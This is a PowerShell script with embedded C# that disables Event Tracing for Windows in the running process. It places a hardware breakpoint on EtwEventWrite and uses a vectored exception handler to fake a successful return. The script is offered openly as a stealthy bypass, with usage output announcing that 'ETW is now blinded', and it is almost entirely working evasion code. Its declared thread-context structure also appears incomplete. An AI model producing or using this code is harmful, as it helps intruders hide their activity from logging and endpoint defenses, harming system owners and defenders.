<#
.SYNOPSIS
    ETW-Bypass via Hardware Breakpoints (HWBP) and Vectored Exception Handling (VEH).
    
.DESCRIPTION
    This script disables Event Tracing for Windows (ETW) for the current PowerShell process.
    It uses a Hardware Breakpoint on 'EtwEventWrite' in ntdll.dll. When the function is called, 
    a VEH interceptor simulates a successful return (RAX=0) without executing the function.
    
    Stealth: High (No memory patching of ntdll.dll).

.USAGE
    PS C:\> . .\ETW-Bypass.ps1
    [*] EtwEventWrite: 0x...
    [+] Hardware Breakpoint Applied. ETW is now blinded.
#>

$Code = @"
using System;
using System.Runtime.InteropServices;

public class EtwBypass
{
    [DllImport("kernel32.dll")]
    static extern IntPtr GetModuleHandle(string lpModuleName);

    [DllImport("kernel32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
    static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

    [DllImport("kernel32.dll")]
    static extern IntPtr GetCurrentThread();

    [DllImport("kernel32.dll")]
    static extern bool GetThreadContext(IntPtr hThread, ref CONTEXT64 lpContext);

    [DllImport("kernel32.dll")]
    static extern bool SetThreadContext(IntPtr hThread, ref CONTEXT64 lpContext);

    [DllImport("kernel32.dll")]
    static extern IntPtr AddVectoredExceptionHandler(uint First, IntPtr Handler);

    [StructLayout(LayoutKind.Sequential)]
    public struct CONTEXT64
    {
        public ulong P1Home; public ulong P2Home; public ulong P3Home; public ulong P4Home; public ulong P5Home; public ulong P6Home;
        public uint ContextFlags; public uint MxCsr; public ushort SegCs; public ushort SegDs; public ushort SegEs; public ushort SegFs; public ushort SegGs; public ushort SegSs;
        public uint EFlags;
        public ulong Dr0; public ulong Dr1; public ulong Dr2; public ulong Dr3; public ulong Dr6; public ulong Dr7;
        public ulong Rax; public ulong Rcx; public ulong Rdx; public ulong Rbx; public ulong Rsp; public ulong Rbp; public ulong Rsi; public ulong Rdi;
        public ulong R8; public ulong R9; public ulong R10; public ulong R11; public ulong R12; public ulong R13; public ulong R14; public ulong R15;
        public ulong Rip;
    }

    static IntPtr pEtwEventWrite = IntPtr.Zero;

    public static long VectoredHandler(IntPtr PExceptionInfo)
    {
        IntPtr pExceptionRecord = Marshal.ReadIntPtr(PExceptionInfo);
        int exceptionCode = Marshal.ReadInt32(pExceptionRecord);

        if (exceptionCode == -2147483644) // 0x80000004 - EXCEPTION_SINGLE_STEP
        {
            IntPtr pContextRecord = Marshal.ReadIntPtr(PExceptionInfo, 8);
            long Rip = Marshal.ReadInt64(pContextRecord, 0xF8);

            if (Rip == (long)pEtwEventWrite)
            {
                // 1. Get Return Address from Stack (RSP offset 0x98)
                long Rsp = Marshal.ReadInt64(pContextRecord, 0x98);
                long ReturnAddress = Marshal.ReadInt64((IntPtr)Rsp);

                // 2. Simulate "RET"
                Marshal.WriteInt64(pContextRecord, 0x98, Rsp + 8); // Pop stack
                Marshal.WriteInt64(pContextRecord, 0xF8, ReturnAddress); // Set RIP to return address

                // 3. Set Return Value (RAX offset 0x78) to 0 (SUCCESS)
                Marshal.WriteInt64(pContextRecord, 0x78, 0);

                return -1; // EXCEPTION_CONTINUE_EXECUTION
            }
        }
        return 0; // EXCEPTION_CONTINUE_SEARCH
    }

    public delegate long HandlerDelegate(IntPtr PExceptionInfo);
    static HandlerDelegate del;

    public static void Enable()
    {
        IntPtr hNtdll = GetModuleHandle("ntdll.dll");
        pEtwEventWrite = GetProcAddress(hNtdll, "EtwEventWrite");
        Console.WriteLine("[*] EtwEventWrite: 0x" + pEtwEventWrite.ToString("x"));

        del = new HandlerDelegate(VectoredHandler);
        IntPtr fnPtr = Marshal.GetFunctionPointerForDelegate(del);
        AddVectoredExceptionHandler(1, fnPtr);

        CONTEXT64 ctx = new CONTEXT64();
        ctx.ContextFlags = 0x10010; // CONTEXT_DEBUG_REGISTERS
        IntPtr hThread = GetCurrentThread();

        if (GetThreadContext(hThread, ref ctx))
        {
            ctx.Dr0 = (ulong)pEtwEventWrite;
            ctx.Dr7 |= 1; // Enable Dr0
            SetThreadContext(hThread, ref ctx);
            Console.WriteLine("[+] Hardware Breakpoint Applied. ETW is now blinded.");
        }
    }
}
"@

Add-Type -TypeDefinition $Code -Language CSharp
[EtwBypass]::Enable()
